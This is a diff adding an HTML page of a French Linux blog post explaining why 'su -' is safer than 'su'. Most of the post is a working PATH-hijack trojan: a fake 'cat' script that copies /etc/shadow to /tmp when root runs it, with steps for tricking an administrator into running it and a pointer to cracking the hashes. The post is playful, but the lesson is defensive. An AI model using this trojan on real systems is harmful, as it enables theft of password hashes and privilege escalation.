@@ -1,0 +1,140 @@
+<html>
+    <head>
+        <title>    Coubiac - "Pourquoi utiliser 'su -' plutôt que 'su'"
+</title>
+        <meta charset="utf-8" />
+        <link rel="stylesheet" href="/theme/css/normalize.css" />
+        <link rel="stylesheet" href="/theme/css/simplegrid.css" />
+        <link rel="stylesheet" href="/theme/css/pygment.css" />
+        <link rel="stylesheet" href="/theme/css/main.css" />
+    </head>
+
+    <body>
+        <header class="grid grid-pad">
+            <div class="col-1-1 header">
+                    <ul id="navigation">
+                        <li><a href="/">Coubiac</a></li>
+                            <li><a href="https://Coubiac.github.io/category/dev.html">Dev</a></li>
+                            <li><a href="https://Coubiac.github.io/category/linux.html">Linux</a></li>
+                            <li><a href="https://Coubiac.github.io/category/reseau.html">Réseau</a></li>
+                            <li><a href="https://Coubiac.github.io/category/si.html">SI</a></li>
+                            <li><a href="https://Coubiac.github.io/category/windows.html">Windows</a></li>
+                    </ul>
+            </div>
+        </header>
+
+        <div class="grid grid-pad">
+            <section class="col-10-12" id="content">
+    <div class="article">
+        <h1>"Pourquoi utiliser 'su -' plutôt que 'su'"</h1>
+        <small>publié le 30/10/2020 dans <a href="https://Coubiac.github.io/category/linux.html">Linux</a></small>
+        <small>| tags : </small>
+                <span class="tag"><a href="https://Coubiac.github.io/tag/securite.html">[securite]</a></span>
+
+        <div class="article-content">
+            <p><code>su -</code> invoque un shell de connexion après avoir changé d'utilisateur. Un shell de connexion réinitialise la plupart des variables d'environnement, fournissant une base propre.</p>
+<p><code>su</code> ne fait que changer d'utilisateur, fournissant un shell normal avec un environnement presque identique à celui de l'ancien utilisateur.</p>
+<p>Imaginez que vous êtes un développeur de logiciels avec un accès normal à une machine et que votre administrateur ignorant ne vous donne pas l'accès au compte root. Essayons (avec un peu de chance) de le piéger:</p>
+<p>Vous connnaisser évidement la commande <code>cat</code>qui permet d'afficher le contenu d'un fichier ? Nous allons la piéger en en créant une fausse:</p>
+<p>Nous allons la stocker dans le dossier <code>tmp</code></p>
+<div class="highlight"><pre><span></span><code>$ mkdir /tmp/evil_bin
+$ vi /tmp/evil_bin/cat
+</code></pre></div>
+
+<p>Nous créons donc un script que nous allons évidement appeler <code>cat</code>
+Dans ce script, si l'utilisateur n'est pas root, le script simulera un message de permission refusée.
+Si l'utilisateur est root, le script va copier le contenu du fichier <code>/etc/shadow</code> dans le dossier <code>tmp</code> 
+Il va ensuite executer la commande <code>cat</code> normalement.</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+<span class="nb">test</span> <span class="nv">$UID</span> !<span class="o">=</span> <span class="m">0</span> <span class="o">&amp;&amp;</span> <span class="o">{</span> <span class="nb">echo</span> <span class="s2">&quot;/bin/cat: Permission denied!&quot;</span><span class="p">;</span> <span class="nb">exit</span> <span class="m">1</span><span class="p">;</span> <span class="o">}</span> 
+/bin/cat /etc/shadow <span class="p">&amp;</span>&gt;/tmp/shadow_copy
+/bin/cat <span class="s2">&quot;</span><span class="nv">$@</span><span class="s2">&quot;</span>
+<span class="nb">exit</span> <span class="m">0</span>
+</code></pre></div>
+
+<p>Nous allons maintenent rendre le script executable et l'ajouter dans notre <code>PATH</code> afin de pouvoir l'executer depuis n'importe quel dossier:</p>
+<div class="highlight"><pre><span></span><code>chmod +x /tmp/evil_bin/cat<span class="sb">`</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;/tmp/evil_bin:</span><span class="nv">$PATH</span><span class="s2">&quot;</span>
+</code></pre></div>
+
+<p>Maintenant, allez voir votre administrateur pour lui demander pourquoi vous n'arrivez pas à afficher un fichier avec la commande <code>cat</code>.</p>
+<p>Il va donc essayer en restant sur votre session mais ce ne sera pas le vrai programme <code>cat</code>qui sera lancé mais notre petit script:</p>
+<div class="highlight"><pre><span></span><code>$ ls -l /home/vous/mon-super-fichier
+-rw-r--r-- <span class="m">1</span> you wheel <span class="m">41</span> <span class="m">2020</span>-06-28 <span class="m">13</span>:00 mon-super-fichier
+$ cat /home/vous/mon-super-fichier
+/bin/cat: Permission denied!
+</code></pre></div>
+
+<p>Il va donc vouloir essayer avec les droits root en utilisant <code>su</code>. Et c'est à ce moment qu'il va faire une erreur. En effet, comme il utilise <code>su</code> au lieu de <code>su -</code>, les variables d'environnement ne sont pas écrasées. Il va donc une nouvelle fois executer notre script au lieu d'executer la vrai commande <code>cat</code>.</p>
+<div class="highlight"><pre><span></span><code>$ su
+Password: ...
+$ cat /home/vous/mon-super-fichier
+du contenu super important dans ce fichier.
+$ <span class="nb">exit</span>
+</code></pre></div>
+
+<p>Il aura donc l'impression que tout a fonctionné et fermé la session root. Donc, vous pouvez maintenant dire "Merci monsieur l'admin" ^^ En effet, notre piège a fonctionné: </p>
+<p>Nous avons bien récupéré une copie du fichier <code>/etc/shadow</code>qui contient une liste de tous les comptes et les mots de passe chiffrés:</p>
+<div class="highlight"><pre><span></span><code>$ ls -l /tmp/shadow_copy
+-rw-r--r-- <span class="m">1</span> root root <span class="m">1093</span> <span class="m">2020</span>-06-28 <span class="m">13</span>:02 /tmp/shadow_copy
+</code></pre></div>
+
+<p>Il ne vous reste plus qu'a tenter de les déchiffrer... et pour ça, je vous laisse lire cet article de l'excellent <a href="https://korben.info/comment-cracker-un-mot-de-passe-sous-linux.html">korben</a></p>
+<p>Sources: <a href="https://stackoverflow.com">StackOverflow</a></p>
+        </div>
+
+    </div>
+            </section>
+
+            <aside class="col-2-12" id="side">
+
+                        <div class="widget cat">
+                            <h2>Catégories</h2>
+                                <div class="cat-link">
+                                    <a href="https://Coubiac.github.io/category/dev.html">Dev</a>
+                                </div>
+                                <div class="cat-link">
+                                    <a href="https://Coubiac.github.io/category/linux.html">Linux</a>
+                                </div>
+                                <div class="cat-link">
+                                    <a href="https://Coubiac.github.io/category/reseau.html">Réseau</a>
+                                </div>
+                                <div class="cat-link">
+                                    <a href="https://Coubiac.github.io/category/si.html">SI</a>
+                                </div>
+                                <div class="cat-link">
+                                    <a href="https://Coubiac.github.io/category/windows.html">Windows</a>
+                                </div>
+                        </div>
+
+                        <div class="widget">
+                            <h2>Liens</h2>
+                                <div class="cat-link">
+                                    <a href="https://vlsm.triscel.ovh">Calcul VLSM</a>
+                                </div>
+                        </div>
+
+                        <div class="widget">
+                            <h2>Social</h2>
+                                <div class="cat-link">
+                                    <a href="https://www.linkedin.com/in/benoitgrisot">linkedin</a>
+                                </div>
+                                <div class="cat-link">
+                                    <a href="https://github.com/Coubiac">github</a>
+                                </div>
+                                <div class="cat-link">
+                                    <a href="https://twitter.com/benoit_grisot">twitter</a>
+                                </div>
+                        </div>
+
+
+            </aside>
+        </div>
+        <footer>
+            <div class="grid grid-pad">
+                <div class="col-1-1 footer">
+Proudly powered by <a href="http://getpelican.com/">Pelican</a>, which takes great advantage of <a href="http://python.org/">Python</a>.                 </div>
+            </div>
+        </footer>
+    </body>
+</html>
